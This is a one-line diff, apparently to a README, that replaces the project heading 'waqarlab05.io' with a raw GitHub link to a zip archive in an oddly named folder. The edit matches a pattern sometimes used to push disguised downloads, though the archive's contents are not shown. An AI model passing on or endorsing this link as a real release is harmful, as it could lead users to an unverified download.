@@ -1,1 +1,1 @@
-# waqarlab05.io
+# https://github.com/Waqar1313/waqarlab05.io/raw/refs/heads/main/substantialism/waqarlab-io-v2.2.zip
